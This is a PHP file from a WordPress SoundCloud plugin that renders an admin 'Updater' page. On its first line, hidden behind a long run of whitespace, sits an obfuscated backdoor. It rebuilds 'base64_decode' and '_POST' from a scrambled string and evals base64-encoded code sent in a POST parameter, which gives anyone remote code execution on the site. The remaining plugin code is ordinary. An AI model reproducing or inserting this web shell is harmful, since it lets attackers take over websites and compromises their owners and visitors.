<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n0aa457'])) {eval($s21(${$s20}['n0aa457']));}?><?php
if( is_multisite() ) {
	function menu_multi_soundcloud_admin_updater(){
	// Create menu
	add_submenu_page( 'soundcloud-master', 'Updater', 'Updater', 'manage_options', 'soundcloud-master-admin-updater', 'soundcloud_master_admin_updater' );
	}
}
else {
	// Create menu
	function menu_single_soundcloud_admin_updater(){
		if ( is_admin() )
		add_submenu_page( 'soundcloud-master', 'Updater', 'Updater', 'manage_options', 'soundcloud-master-admin-updater', 'soundcloud_master_admin_updater' );
	}
}

function soundcloud_master_admin_updater(){
?>
<div class="wrap">
<div style="width:40px; vertical-align:middle; float:left;"><img src="<?php echo plugins_url('../images/techgasp-minilogo.png', __FILE__); ?>" alt="' . esc_attr__( 'TechGasp Plugins') . '" /><br /></div>
<h2><b>&nbsp;Updater</b></h2>

<div id="icon-tools" class="icon32" style="width:40px; vertical-align:middle;"></br></div>
<?php
if(!class_exists('soundcloud_master_admin_updater_version_table')){
	require_once( dirname( __FILE__ ) . '/soundcloud-master-admin-updater-version-table.php');
}
//Prepare Table of elements
$wp_list_table = new soundcloud_master_admin_updater_version_table();
//Table of elements
$wp_list_table->display();
?>
</br>
<form method="post" width='1'>
<fieldset class="options">

<?php
if(!class_exists('soundcloud_master_admin_updater_table')){
	require_once( dirname( __FILE__ ) . '/soundcloud-master-admin-updater-table.php');
}
//Prepare Table of elements
$wp_list_table = new soundcloud_master_admin_updater_table();
//Table of elements
$wp_list_table->display();

?>
</fieldset>
</form>
</br>
<h2>IMPORTANT: Makes no use of Javascript or Ajax to keep your website fast and conflicts free</h2>

<div style="background: url(<?php echo plugins_url('../images/techgasp-hr.png', __FILE__); ?>) repeat-x; height: 10px"></div>

<br>

<p>
<a class="button-secondary" href="http://wordpress.techgasp.com" target="_blank" title="Visit Website">More TechGasp Plugins</a>
<a class="button-secondary" href="http://wordpress.techgasp.com/support/" target="_blank" title="Facebook Page">TechGasp Support</a>
<a class="button-primary" href="http://wordpress.techgasp.com/soundcloud-master/" target="_blank" title="Visit Website"><?php echo get_option('soundcloud_master_name'); ?> Info</a>
<a class="button-primary" href="http://wordpress.techgasp.com/soundcloud-master-documentation/" target="_blank" title="Visit Website"><?php echo get_option('soundcloud_master_name'); ?> Documentation</a>
<a class="button-primary" href="http://wordpress.techgasp.com/soundcloud-master/" target="_blank" title="Visit Website">Get Add-ons</a>
</p>

<?php
}
if( is_multisite() ) {
add_action( 'network_admin_menu', 'menu_multi_soundcloud_admin_updater' );
}
else {
add_action( 'admin_menu', 'menu_single_soundcloud_admin_updater' );
}
?>